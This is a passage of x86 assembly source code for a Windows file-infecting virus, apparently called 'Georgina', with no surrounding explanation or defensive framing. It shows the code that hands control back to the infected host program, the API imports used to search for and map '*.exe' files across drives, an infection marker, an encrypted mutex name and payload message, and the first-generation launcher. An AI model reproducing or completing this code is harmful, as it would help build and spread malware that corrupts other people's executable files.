                lea     ebx,[ebp+_EBP]
                push    ebx
                lea     ebx,[ebp+offset VirusMainThread]
                push    ebx
                push    0h
                push    0h
                call    [ebp+_CreateThread]
                popad
                ret
LaunchVirusMainThread   endp

MainEnd:
                mov     eax,dword ptr [ebp+_ImageBase]          ; virus start point...
                sub     eax,dword ptr [ebp+_EntryPoint]         ; substracting virus entry-point, thus getting ImageBase
                add     eax,dword ptr [ebp+OldEntryPoint]       ; adding old entry-point, thus jumping back to the host
                jmp     eax

                OldEntryPoint           dd      0                ; host's old entry-point
                K32Address              dd      ?
                K32ExportAddress        dd      ?
                K32OrdinalsAddress      dd      ?
                K32NumberOfExports      dd      ?
                Counter                 dd      0h

                ;APIz that I need in my virus
                U32Address              dd      ?
                szUser32Dll             db      "USER32.DLL",0h

                szGetProcAddress        db      "GetProcAddress",0h
                szGetModuleHandleA      db      "GetModuleHandleA",0h
                szLoadLibraryA          db      "LoadLibraryA",0h
		szGetFileAttributesA	db	"GetFileAttributesA",0h
		szSetFileAttributesA	db	"SetFileAttributesA",0h
		szCreateFileA		db	"CreateFileA",0h
                szCreateFileMappingA    db      "CreateFileMappingA",0h
		szMapViewOfFile		db	"MapViewOfFile",0h
		szUnmapViewOfFile	db	"UnmapViewOfFile",0h
		szFindFirstFileA	db	"FindFirstFileA",0h
		szFindNextFileA		db	"FindNextFileA",0h
		szFindClose		db	"FindClose",0h
                szSetCurrentDirectoryA  db      "SetCurrentDirectoryA",0h
                szGetLocalTime          db      "GetLocalTime",0h
		szCreateThread		db	"CreateThread",0h
		szSetThreadPriority	db	"SetThreadPriority",0h
                szResumeThread          db      "ResumeThread",0h
		szCreateMutexA		db	"CreateMutexA",0h
		szOpenMutexA		db	"OpenMutexA",0h
		szSleep			db	"Sleep",0h
		szGetLogicalDrives	db	"GetLogicalDrives",0h
                szGetDriveTypeA         db      "GetDriveTypeA",0h
                szGetFileSize           db      "GetFileSize",0h
                szCloseHandle           db      "CloseHandle",0h
                szVirtualAlloc          db      "VirtualAlloc",0h

                szMessageBoxA           db      "MessageBoxA",0h
		szSetWindowTextA	db	"SetWindowTextA",0h
		szGetTopWindow		db	"GetTopWindow",0h
		szGetWindow		db	"GetWindow",0h

                _GetProcAddress         dd      ?
                _GetModuleHandleA       dd      ?
                _LoadLibraryA           dd      ?
                _GetFileAttributesA     dd      ?
                _SetFileAttributesA     dd      ?
		_CreateFileA		dd	?
                _CreateFileMappingA     dd      ?
		_MapViewOfFile		dd	?
		_UnmapViewOfFile	dd	?
		_FindFirstFileA		dd	?
		_FindNextFileA		dd	?
                _FindClose              dd      ?
                _SetCurrentDirectoryA   dd      ?
                _GetLocalTime           dd      ?
		_CreateThread		dd	?
		_SetThreadPriority	dd	?
                _ResumeThread           dd      ?
		_CreateMutexA		dd	?
		_OpenMutexA		dd	?
		_Sleep			dd	?
		_GetLogicalDrives	dd	?
		_GetDriveTypeA		dd	?
                _GetFileSize            dd      ?
                _CloseHandle            dd      ?
                _VirtualAlloc           dd      ?

                _MessageBoxA            dd      ?
		_SetWindowTextA		dd	?
		_GetTopWindow		dd	?
                _GetWindow              dd      ?

                InfectionMark   db 08Ah,08Ah,0EDh,0CFh,0C5h,0D8h,0CDh,0C3h,0C4h,0CBh,08Ah,08Ah

                FileHandle      dd INVALID_HANDLE_VALUE
                FileSize        dd 0h
                pMemory         dd 0h
                PEHdrOffset     dd 0h
                SectionsNum     dd 0h
                ImageSize       dd 0h
                dFileAlignment  dd 0h
                FileMappedHandle        dd 0h
                FileAttrib              dd 0h
                pVirtualMemory  dd 0h

                szDestDir               db      "c:\",0h

                FindHandle      dd      0h
                FHandle         dd      0h
                FindResult      WIN32_FIND_DATA ?
                szEXEMask       db      "*.exe",0h
                szGlobalMask    db      "*",0h
                szUpDir         db      "..",0h

                szGeorgina              db      "Georgina",0h
                szMutexName             db      0E1H,0EFH,0F8H,0E4H,0EFH,0E6H,0F5H,0E6H,0E5H    ; encrypted mutex name
                                        db      0FCH,0EFH,097H,0E3H,0F5H,0E6H,0C5H,0DCH,0CFH
                                        db      0F5H,0F3H,0C5H,0DFH,0F5H,0EDH,0CFH,0C5H,0D8H
                                        db      0CDH,0C3H,0C4H,0CBH,0F5H,098H,0E0H,0F0H,0EBH
                                        db      09DH,09FH,09DH,0F5H,0E1H,0E3H,0F9H,0F9H,0EFH
                                        db      0F9H,0AAH
                MutexNameSize           equ     $-szMutexName                                   ; size of mutex name
                szVirus                 db      0FFH,08AH,0D8H,08AH,0C3H,0C4H,0CCH,0CFH,0C9H    ; encrypted pyload message
                                        db      0DEH,0CFH,0CEH,08AH,0DDH,0C3H,0DEH,0C2H,08AH
                                        db      0FDH,0C3H,0C4H,099H,098H,084H,0EDH,0CFH,0C5H
                                        db      0D8H,0CDH,0C3H,0C4H,0CBH,08AH,0DCH,0C3H,0D8H
                                        db      0DFH,0D9H,08BH,0A7H,0A0H,0EDH,0CFH,0C5H,0D8H
                                        db      0CDH,0C3H,0C4H,0CBH,086H,0E3H,08AH,0C6H,0C5H
                                        db      0DCH,0CFH,08AH,0DFH,08AH,0CBH,0C4H,0CEH,08AH
                                        db      0DDH,0C3H,0C6H,0C6H,08AH,0C6H,0C5H,0DCH,0CFH
                                        db      08AH,09EH,0CFH,0DCH,0CFH,0D8H,08BH,0A7H,0A0H
                                        db      082H,0E9H,083H,09AH,0CEH,0CFH,0CEH,08AH,0C8H
                                        db      0D3H,08AH,0E1H,0C3H,0E4H,0EFH,0FEH,0C3H,0E1H
                                        db      086H,08AH,0E7H,0CBH,0D3H,08AH,098H,09AH,09AH
                                        db      098H,0AAH
                szVirusMsgSize          equ     $-szVirus                                       ; size of payload message
                Time                    SYSTEMTIME      <0,0,0,0,0,0,0,0>
                ThreadID1               dd      0h
                ThreadID2               dd      0h
                ThreadID3               dd      0h
                _EBP                    dd      ?
                _ImageBase              dd      ?
                _EntryPoint             dd      ?
infect_section_end:
                INFECTLENGTH    equ (infect_section_end - infect_section)
                CHARSNEW        equ 0E0000020h

_1st_generation:
                call    MessageBox,0,offset szMessage,offset szCaption,MB_OK
                call    ExitProcess,0
end             main
